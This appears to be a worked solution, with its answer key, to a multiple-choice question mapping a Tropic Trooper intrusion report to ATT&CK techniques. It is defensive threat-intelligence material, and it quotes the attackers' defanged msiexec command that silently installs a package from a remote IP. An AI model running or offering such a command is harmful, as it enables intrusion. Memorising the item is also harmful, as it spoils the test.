### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- Tropic Trooper used exploits for CVE-2017-11882 or CVE-2018-0802 in Microsoft Office's Equation Editor (EQNEDT32.EXE).
- They downloaded and installed an installer package (.msi) using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Persistence:**
- The backdoor loads and decrypts a configuration file.
- It uses SSL to connect to C&C servers.

**Defense Evasion:**
- DLL hijacking is used to evade antivirus detection.
- The installer drops files into the Apple/Update directory and creates a hidden directory (UFile).
- The loader (FakeRun) executes dllhost.exe and injects a malicious DLL (the backdoor).

**Command and Control:**
- TClient uses SSL to connect to the C&C server.
- The C&C server and configuration values are not hardcoded, allowing for easy updates.
- TClient uses symmetric encryption and custom SSL libraries to connect to the C&C server.

**Others:**
- Exploit-laden Microsoft Office documents are used to deliver malware.
- The documents use job vacancies in socio-politically sensitive organizations to lure targets.
- The MSI file drops three files and creates a hidden directory.
- The backdoor is loaded through DLL hijacking by a benign file (sidebar.exe).

#### 2. Analyze the Question

**Question:**
- After Tropic Trooper executed commands via exploits in Microsoft Office's Equation Editor (EQNEDT32.EXE) to gain initial access, which ATT&CK technique most likely occurred when the execution of the backdoor's installer leveraged users' action or interaction to trigger its deployment?

**Answer Choices:**
- A: T1573-Encrypted Channel
- B: T1564.009-Resource Forking
- C: T1648-Serverless Execution
- D: T1204-User Execution

#### 3. Compare and Evaluate

**Initial Access:**
- The initial access was achieved through exploits in Microsoft Office's Equation Editor (EQNEDT32.EXE).

**User Interaction:**
- The question specifically asks about the technique that occurred when the execution of the backdoor's installer leveraged users' action or interaction to trigger its deployment.

**Evaluating Answer Choices:**
- **A: T1573-Encrypted Channel**: This technique involves using encryption to protect command and control communications. While the report mentions SSL for C&C, this does not involve user interaction.
- **B: T1564.009-Resource Forking**: This technique involves hiding data in resource forks, which is not mentioned in the report.
- **C: T1648-Serverless Execution**: This technique involves executing code without a traditional server, which is not relevant to the user interaction described.
- **D: T1204-User Execution**: This technique involves tricking users into executing malicious files, which aligns with the use of exploit-laden Microsoft Office documents to deliver malware. The documents use job vacancies to lure targets, and the user interaction is necessary to trigger the deployment of the backdoor.

#### 4. Provide a Step-by-Step Reasoning and Final Answer

**Reasoning:**
- The initial access was achieved through exploits in Microsoft Office's Equation Editor.
- The backdoor's installer was likely triggered by the user opening the exploit-laden Microsoft Office document.
- The user interaction (opening the document) is necessary to execute the backdoor's installer.
- The technique that best describes this user interaction is T1204-User Execution.

**Final Answer:**
D: T1204-User Execution
